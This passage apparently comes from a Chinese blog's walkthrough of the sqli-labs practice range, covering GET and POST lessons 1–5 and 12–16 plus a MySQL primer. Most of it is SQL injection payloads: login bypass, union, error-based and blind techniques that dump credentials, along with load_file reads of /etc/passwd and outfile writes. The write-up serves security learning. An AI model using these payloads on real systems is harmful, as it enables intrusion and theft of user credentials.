class="line">uname=1&quot; &amp; passwd=1无法登录无回显</span><br><span class="line">uname=1 &amp; passwd=1&quot;无法登录无回显</span><br></pre></td></tr></table></figure><p>说明是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; or 1=1# &amp; passwd=1万能语句可以登进去</span><br><span class="line"></span><br><span class="line">uname=1&#x27; order by 4# &amp; passwd=1回显Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line">uname=1&#x27; order by 2# &amp; passwd=1无法登录无回显</span><br></pre></td></tr></table></figure><p>说明只有两个字段</p><p>开始注数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&#x27; union select 1,database() # &amp; passwd=1Your Password:security</span><br><span class="line"></span><br><span class="line">uname=-1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata # &amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# &amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;# &amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=-1&#x27; union select 1,group_concat(username,password) from users# &amp; passwd=1</span><br></pre></td></tr></table></figure><h2 id="less-12基于错误的双引号POST型字符型变形的注入"><a href="#less-12基于错误的双引号POST型字符型变形的注入" class="headerlink" title="less-12基于错误的双引号POST型字符型变形的注入"></a>less-12基于错误的双引号POST型字符型变形的注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1 &amp; passwd=1无法登录无回显</span><br><span class="line">uname=1&#x27; &amp; passwd=1 无法登录无回显</span><br><span class="line">uname=1&quot; &amp; passwd=1 version for the right syntax to use near &#x27;1&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure><p>说明是双引号闭合,这里从报错信息可以发现还有一个括号进行保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot; or 1=1#&amp; passwd=1version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="line">uname=1&quot;) or 1=1#&amp; passwd=1正常登录进去</span><br></pre></td></tr></table></figure><p><strong>extractvalue()函数报错注入</strong></p><p>上一关使用了基本查询语句,接下来我们使用mysql函数报错注入,这里选取extractvalue()函数,注意这里的extracectvalue()函数最大爆32位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;)  and extractvalue(1,concat(0x7e,(select database()))) #&amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #&amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;))) #&amp; passwd=1</span><br><span class="line"></span><br><span class="line">uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) #&amp; passwd=1</span><br></pre></td></tr></table></figure><p>这里会显示不全</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162127058.png" alt="image-20220316212744988"></p><p>那么我们可以这样写,使用not in()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;)  and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelinal&#x27;)))) #&amp; passwd=1</span><br></pre></td></tr></table></figure><p><strong>floor()函数报错注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;) Union select count(*),concat((select password from users limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x; #&amp; passwd=1</span><br></pre></td></tr></table></figure><h2 id="less-13-POST单引号变形双注入"><a href="#less-13-POST单引号变形双注入" class="headerlink" title="less-13 POST单引号变形双注入"></a>less-13 POST单引号变形双注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1 &amp; passwd=1无法登录无回显</span><br><span class="line">uname=1&#x27; &amp; passwd=1 version for the right syntax to use near &#x27;1&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="line">uname=1&quot; &amp; passwd=1 无法登录无回显</span><br></pre></td></tr></table></figure><p>说明单引号加括号进行闭合</p><p>这里有报错信息的出现,说明可以使用报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;)or 1=1 # &amp; passwd=1登进去发现没有显示用户信息,显示了一个successfully logged in</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162137425.png" alt="image-20220316213759334"></p><p>当失败时</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162138243.png" alt="image-20220316213825162"></p><p>可以发现有显著的不同,那么这里也可以使用布尔盲注来实现</p><p><strong>报错型extractvalue()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) and extractvalue(1,concat(0x7e,(select database()))) -- # &amp;passwd=1</span><br></pre></td></tr></table></figure><p><strong>报错型floor()  又叫双注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27;) union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x -- #&amp;passwd=1</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><p>利用 regexp （正则表达式）获取security数据库中 users 表中的列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&#x27;) or 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^userna[a-z]&#x27; limit 0,1) -- #&amp;passwd=1登录成功</span><br><span class="line"></span><br><span class="line">uname=-1&#x27;) or 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^usernaa[a-z]&#x27; limit 0,1) -- #&amp;passwd=1登录失败</span><br><span class="line"></span><br><span class="line">要注意这里的匹配的username在不断变化</span><br></pre></td></tr></table></figure><h2 id="less-14POST单引号变形双注入"><a href="#less-14POST单引号变形双注入" class="headerlink" title="less-14POST单引号变形双注入"></a>less-14POST单引号变形双注入</h2><p>就测试一下怎么闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&amp;passwd=1无法登录无回显</span><br><span class="line">uname=1&#x27;&amp;passwd=1无法登录无回显</span><br><span class="line">uname=1&quot;&amp;passwd=1version for the right syntax to use near &#x27;1&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="line">uname=1&quot;or 1=1#&amp;passwd=1登录成功</span><br></pre></td></tr></table></figure><p>说明是双引号闭合</p><p><strong>报错型extractvalue()</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;and extractvalue(1,concat(0x7e,(select database()))) -- # &amp;passwd=1</span><br></pre></td></tr></table></figure><p><strong>报错型floor()  又叫双注入</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot; union select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x -- #&amp;passwd=1</span><br></pre></td></tr></table></figure><h2 id="less-15基于布尔型-x2F-时间延迟单引号POST型盲注"><a href="#less-15基于布尔型-x2F-时间延迟单引号POST型盲注" class="headerlink" title="less-15基于布尔型&#x2F;时间延迟单引号POST型盲注"></a>less-15基于布尔型&#x2F;时间延迟单引号POST型盲注</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&amp;passwd=1   登录失败无回显uname=1&amp;passwd=1登录失败无回显</span><br><span class="line">uname=1&amp;passwd=1&#x27;登录失败无回显uname=1&#x27;&amp;passwd=1登录失败无回显</span><br><span class="line">uname=1&amp;passwd=1&quot; 登录失败无回显uname=1&quot;&amp;passwd=1登录失败无回显</span><br></pre></td></tr></table></figure><p>一个报错信息都没有,那么说明是非报错的注入接着测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1 or 1=1#&amp;passwd=1登录失败无回显</span><br><span class="line">uname=1&#x27; or 1=1#&amp;passwd=1登录成功</span><br><span class="line">uname=1&quot; or 1=1#&amp;passwd=1登录失败无回显</span><br></pre></td></tr></table></figure><p>这里就知道是单引号闭合</p><p>接下来可以使用布尔盲注,或者时间盲注</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; or length(database())=8#&amp;passwd=1登录成功</span><br></pre></td></tr></table></figure><p>当然时间盲注也是可以的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&amp;passwd=1&#x27; or if(length(database())=8,1,sleep(5))-- #</span><br></pre></td></tr></table></figure><h2 id="less-16基于bool型-x2F-时间延迟的双引号POST型盲注"><a href="#less-16基于bool型-x2F-时间延迟的双引号POST型盲注" class="headerlink" title="less-16基于bool型&#x2F;时间延迟的双引号POST型盲注"></a>less-16基于bool型&#x2F;时间延迟的双引号POST型盲注</h2><p>测试一下闭合方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;) or 1=1#&amp;passwd=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203162215208.png" alt="image-20220316221510102"></p><p>太好了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&quot;) or 1=1#&amp;passwd=uname=1&amp;passwd=1&quot;) or if(length(database())=8,1,sleep(5))-- #</span><br></pre></td></tr></table></figure><p>和上一关语句一个样,接下来就很简单了</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs靶场记录GET型(一)</title>
      <link href="/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B(%E4%B8%80)/"/>
      <url>/ctf/sql/sql-sqlilabs%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95GET%E5%9E%8B(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlilabs靶场记录GET型-一"><a href="#sqlilabs靶场记录GET型-一" class="headerlink" title="sqlilabs靶场记录GET型(一)"></a>sqlilabs靶场记录GET型(一)</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases: 显示数据库</span><br><span class="line">use security;使用数据库</span><br><span class="line">show tables;展示表名</span><br><span class="line">desc emails;对某张表降序显示</span><br><span class="line">information_schema系统数据库</span><br></pre></td></tr></table></figure><p>其中schema代表数据库</p><p><strong>基础查询语句</strong></p><p>查询数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure><p>使用下面的语句可查所以表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&quot;security&quot;;</span><br></pre></td></tr></table></figure><p>猜表的所有列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&#x27;xxx&#x27;;</span><br></pre></td></tr></table></figure><p>查询字段内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,email_id from emails;</span><br></pre></td></tr></table></figure><p><strong>limit</strong></p><p>返回前三条数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 3;</span><br></pre></td></tr></table></figure><p>从索引1开始的前两条数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 1,2;</span><br></pre></td></tr></table></figure><p><strong>concat()</strong></p><p>用于连接字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select concat(&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);输出112233</span><br><span class="line">select concat_ws(&#x27;-&#x27;,&#x27;11&#x27;,&#x27;22&#x27;,&#x27;33&#x27;);输出11-22-33</span><br><span class="line">group_concat(column_name)将字段的所有数据用,连接作为字符串输出</span><br></pre></td></tr></table></figure><p><strong>内置数据库information_schema</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">里面有三张表:schemata tables columns</span><br><span class="line">schemata表中存储了mysql中所有数据库的信息包括数据库名编码类型</span><br><span class="line">tables表中存储了mysql中所有的数据库的表的信息</span><br><span class="line">columns表中存储了mysql中所有表的字段信息</span><br></pre></td></tr></table></figure><p><strong>order by</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table_name order by 3 按第三列排序</span><br><span class="line">order by column_name asc(升序)/desc(降序)</span><br></pre></td></tr></table></figure><p><strong>union</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两个查询的列数必须相同</span><br><span class="line">select 返回的数据必须相同类型</span><br></pre></td></tr></table></figure><p><strong>user表</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql中存在一个独立的数据库,名字叫做mysql,当中有很多表,保存着mysql中的各种参数,其中user表段设置了mysql数据库用户的部分信息</span><br><span class="line">user表段中,user字段为用户登录名,可以有相同的名字重复</span><br><span class="line">password字段为登录的密码哈希值,是40位的密文,类似于md5</span><br><span class="line">host字段设置的是这个用户可以在哪些机器上面的登录,如果为localhost表示只能在本机登录,host可以是数据库ip也可以是数据库服务器的名称,若host为localhost的话不一定没有希望,如果服务器网站装有phpmyadmin,仍可以利用</span><br><span class="line">file_priv字段规定了这个用户是不是可以读取硬盘的里的文件,设置为Y表示允许,设置为N表示禁止</span><br></pre></td></tr></table></figure><p><strong>参数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user():数据库的用户格式为user@server</span><br><span class="line">database(): 当前数据库名</span><br><span class="line">version(): 当前使用数据库的版本</span><br><span class="line">@@datadir: 数据路径.通常用于load_file是猜测网站路径</span><br><span class="line">@@version_compile_os: 操作系统版本</span><br><span class="line">concat(): 联合数据concat(username,0x3a,password)中间加一个hex编码值,表示冒号</span><br><span class="line">group_concat(): 联合数据</span><br><span class="line">concat_ws(separator,str1,str2,...): 含有分隔符地连接字符串</span><br><span class="line"></span><br><span class="line">hex()和unhex(): 有一些注入点由于数据库中数据字段类型定义,可以不支持union来显示某些不同类型的内容,所以使用hex对数据进行hex编码,例如 union select hex(password) from mysql.user注入出来的数据全是0x1234abc类似的数据,再次转回数据即可</span><br><span class="line"></span><br><span class="line">load_file(): 这是mysql以文本读取文件的参数 例如:linux系统的网站load_file(&#x27;/etc/passwd&#x27;)或者windows系统的网站load_file(&#x27;c:boot.ini&#x27;),这个参数的前提是你的user()用户在mysql.user表中的字段file_priv设置为Y.但是要注意的是如果为windows系统,保险起见将路径设置为双斜杠\\,目的是为了防止转义</span><br><span class="line">很多时候php的网站会设置gpf为on,对特殊字符自动转义.那么load_file(&#x27;c:boot.ini&#x27;)就变成</span><br><span class="line">load_file(\&#x27;c:\\\\boot.ini\&#x27;)出现语法错误解决方法就是将c:\\boot.ini进行hex编码,得到0x633a5c5c6</span><br><span class="line">将原句修改为 union select 1,load_file(0x12424324),接可以使用load_file参数后面不加&#x27;</span><br><span class="line"></span><br><span class="line">select xxoo into outfile &#x27;路径&#x27; : 写文件</span><br></pre></td></tr></table></figure><p><strong>常用命令</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询所有用户</span><br><span class="line">select Host,User,Password from user;</span><br><span class="line"></span><br><span class="line">查询用户权限:all表示所有权限,select表示只查穿线,update表示只改权限,delete表示只删权限</span><br><span class="line">show grants for &quot;user&quot;@&quot;host&quot;;</span><br><span class="line">show grants for &quot;root&quot;@&quot;localhost&quot;;</span><br><span class="line"></span><br><span class="line">添加授权用户(新创建的用户,默认情况下是没有任何权限的):使用root用户连接到服务器</span><br><span class="line">create user &quot;用户名&quot;@&quot;IP地址&quot; indentified by &quot;密码&quot;;</span><br><span class="line">create user &quot;haidon&quot;@&quot;%&quot; identified by &quot;123456&quot;;</span><br><span class="line">create user &quot;haidpm&quot;@&quot;loaclhost&quot; identified by &quot;123456&quot;;</span><br><span class="line">IP地址表示方法:</span><br><span class="line">% 表示用户可以从任何地址连接到服务器</span><br><span class="line">localhost 表示用户只能从本地连接到服务器</span><br><span class="line">指定一个ip表示用户只能从此ip连接到服务器</span><br><span class="line"></span><br><span class="line">分配用户权限(给用户授权)</span><br><span class="line">grant 权限列表 on 库.表 to &quot;用户名&quot;@&quot;ip地址&quot; with grant option;</span><br><span class="line">grant all privileges on *.* to &quot;haidon&quot;@&quot;%&quot; with grant option;</span><br><span class="line">grant all privileges on *.* to &quot;haidon&quot;@&quot;%&quot; identified by &#x27;test&#x27; with grant option; </span><br><span class="line">grant all privileges on domain_check.tb_user to &quot;haidon&quot;@&quot;localhost&quot; with grant option;</span><br><span class="line">grant select on domain_check.tb_user to &quot;haidon&quot;@&quot;localhost&quot; with grant option;</span><br><span class="line">grant select,insert on domain_check.tb_user to &quot;haidon&quot;@&quot;132.24.98.25&quot; with grant option;  </span><br><span class="line">1.权限列表：select、update、delete、insert、alter、drop、create、...(show)</span><br><span class="line">2.库.表：*.*表示所有库的所有表。with grant option表示它具有grant权限。密码是test。 </span><br><span class="line">3.如果带了 with grant option，那么用户haidon可以将select ,update权限传递给其他用户( 如xiaodon)。</span><br><span class="line">4.如果没带 with grant option，那么用户haidon不能给用户xiaodon授权。</span><br><span class="line">5.all后面加上privileges，具体到哪些权限时得看MySQL版本，5.7版本不加privileges，8.0版本加privileges。</span><br><span class="line"></span><br><span class="line">6. insert into user values(&quot;%&quot;,&quot;haidon&quot;,password(&quot;test&quot;),&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;); </span><br><span class="line">flush privileges; 这两句和上面第3句grant的效果是一样的。</span><br><span class="line"></span><br><span class="line">7.insert into user (host,user) values(&quot;132.24.98.25&quot;,&quot;haidon&quot;);</span><br><span class="line">insert into db values(&quot;132.24.98.25&quot;,&quot;haidon&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;Y&quot;,&quot;N&quot;,&quot;N&quot;,&quot;N&quot;,&quot;N&quot;) </span><br><span class="line">flush privileges; 这三句和上面第6句grant的效果是一样的。</span><br><span class="line"></span><br><span class="line">收回用户权限</span><br><span class="line">revoke all on *.* from &quot;haidon&quot;@&quot;localhost&quot;;</span><br><span class="line">revoke all on domain_check.tb_user from &quot;haidon&quot;@&quot;localhost&quot;;</span><br><span class="line">revoke select  on *.* from &quot;haidon&quot;@&quot;localhost&quot;;</span><br><span class="line"> </span><br><span class="line">删除授权用户</span><br><span class="line">drop user &quot;用户名&quot;@&quot;ip地址&quot;</span><br><span class="line">drop user &quot;haidon&quot;@&quot;%&quot;</span><br><span class="line">delete from user where user=&#x27;haidon&#x27;; </span><br><span class="line">flush privileges; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="less-1获取-基于错误-单引号-字符串"><a href="#less-1获取-基于错误-单引号-字符串" class="headerlink" title="less-1获取-基于错误-单引号-字符串"></a>less-1获取-基于错误-单引号-字符串</h2><p>id后加一个’出现报错语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151815375.png" alt="image-20220315181520310"></p><p>那么我们需要去掉多余的’接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or 1=1--+</span><br></pre></td></tr></table></figure><p>#是%23 空格时%20 ‘是%27 + 是空格</p><p>当分别尝试?id&#x3D;1    ？id&#x3D;1’   ?id&#x3D;1” 为什么只有?id&#x3D;1’ 报错？<br>     那是因为Mysql查询并不严格， 而在select * from users where id&#x3D;’1’’ limit 0,1  中有一个单引号没有闭合而报错，而在select * from users where id&#x3D;’1” ‘ limit 0,1  中虽然多了一个双引号，但mysql查询时会把它当成两个单引号，而这两个单引号又闭合了，所以查询时不会报错</p><p>根据报错猜测sql语句应该是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users where id=&#x27;$_GET[id]&#x27; limit 0,1;</span><br></pre></td></tr></table></figure><p>那么当我们传入1’时</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users where id=&#x27;1&#x27;&#x27; limit 0,1;</span><br></pre></td></tr></table></figure><p>会产生单数的单引号,那么接下来应该把这个单引号注释掉加上–+ 或者 #</p><p>发现在家–+ 或%23时+是空格的意思也是%20  #是%23</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151824310.png" alt="image-20220315182431253"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151825132.png" alt="image-20220315182535082"></p><p>这时会爆不知道4在哪里说明多了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151826059.png" alt="image-20220315182652005"></p><p>这说明总共有三列数据</p><ul><li><p>接着使用union联合查询将两个sql语句进行联合</p></li><li><p>union前后的两个sql语句的选择列数必须相同才可以</p></li><li><p>对于union而言,如果第一个sql语句的查询语句为错误的话,那么他会将第二个sql语句的查询结果作为最后的数据,所以前面一个id输入一个非正确的值,如-1</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151831001.png" alt="image-20220315183100939"></p><p>发现23有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着爆数据库</span><br><span class="line">id=-1&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">爆表名</span><br><span class="line">id=-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">爆数据名</span><br><span class="line">id=-1&#x27;union select 1,group_concat(username,password),3 from security.users--+</span><br><span class="line">id=-1&#x27;union select 1,group_concat(username,password),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151837257.png" alt="image-20220315183740190"></p><h2 id="less-2获取-基于错误-基于整数"><a href="#less-2获取-基于错误-基于整数" class="headerlink" title="less-2获取-基于错误-基于整数"></a>less-2获取-基于错误-基于整数</h2><p>当尝试id&#x3D;1 id&#x3D;1’ id&#x3D;1” 发现 id&#x3D;1’ id&#x3D;1”报错,这说明是数字型注入</p><p>这里相比于less1的sql语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,password from users where id=$_GET[id] limit 0,1</span><br></pre></td></tr></table></figure><p>可以尝试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1--+正常id=-1 or 1=1--+正常</span><br><span class="line">id=1 and 1=2--+报错id=-1 or 1=2--+报错</span><br></pre></td></tr></table></figure><p>接下来就是注入数据了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 4--+</span><br><span class="line">id=1 order by 3--+</span><br><span class="line">id=-1 union select 1,2,3--+</span><br><span class="line">id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1 union select 1,group_concat(username,password),3 from users--+</span><br></pre></td></tr></table></figure><h2 id="less-3基于错误-带括号的单引号字符串"><a href="#less-3基于错误-带括号的单引号字符串" class="headerlink" title="less-3基于错误-带括号的单引号字符串"></a>less-3基于错误-带括号的单引号字符串</h2><p>看起来是单引号外面又加了一个圆括号</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=(&#x27;$id&#x27;) limit 0,1;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;)--+</span><br></pre></td></tr></table></figure><p>注入数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;) order by 4--+</span><br><span class="line">id=1&#x27;) order by 3--+</span><br><span class="line">id=-1&#x27;) union select 1,2,3--+</span><br><span class="line">id=-1&#x27;)union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">id=-1&#x27;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1&#x27;)union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1&#x27;)union select 1,group_concat(username,password),3 from users--+</span><br></pre></td></tr></table></figure><h2 id="less-4基于错误的GET双引号字符型注入"><a href="#less-4基于错误的GET双引号字符型注入" class="headerlink" title="less-4基于错误的GET双引号字符型注入"></a>less-4基于错误的GET双引号字符型注入</h2><p>源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where (&quot;id&quot;) limit 0,1;</span><br></pre></td></tr></table></figure><p>直接闭合注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&quot;)</span><br></pre></td></tr></table></figure><p>注入数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&quot;) order by 4--+</span><br><span class="line">id=1&quot;) order by 3--+</span><br><span class="line">id=-1&quot;) union select 1,2,3--+</span><br><span class="line">id=-1&quot;)union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">id=-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1&quot;)union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+</span><br><span class="line"></span><br><span class="line">id=-1&quot;)union select 1,group_concat(username,password),3 from users--+</span><br></pre></td></tr></table></figure><h2 id="less-5双注入GET单引号字符型注入"><a href="#less-5双注入GET单引号字符型注入" class="headerlink" title="less-5双注入GET单引号字符型注入"></a>less-5双注入GET单引号字符型注入</h2><p>这里先经过简单尝试发现有注入并且是’闭合</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+ 回显you are in....</span><br><span class="line">id=1&#x27; and 1=2--+无回显</span><br></pre></td></tr></table></figure><p>因此当查询语句正确是返回you are in…错误时无回显</p><p>数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;and length(database())=8--+回显you are in....</span><br><span class="line">id=1&#x27;and length(database())=7--+无回显</span><br></pre></td></tr></table></figure><p>说明数据库长度是8</p><p>那么接下来就可以写脚本来查询数据了</p><p>注意这里还可以使用其他类似的函数去截取数据,如substr,和ascii返回ascii值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=&#x27;a&#x27;-- #</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p><strong>sleep()函数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #</span><br><span class="line">当正确时无明显延迟,错误有明显延迟</span><br></pre></td></tr></table></figure><p><strong>benchmakrk()函数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&#x27;MSG&#x27;,&#x27;by 5 seconds&#x27;)),null)),2,3 FROM (select database() as current) as tb1-- #</span><br></pre></td></tr></table></figure><h3 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a><strong>双查询注入</strong></h3><p>这里我们使用的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27;union select count(*),count(*), concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">id=-1&#x27;union select count(*),count(*), concat(&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line">这里修改limit x,1可以遍历数据</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select count(*),1, concat(&#x27;~&#x27;,(select column_name from 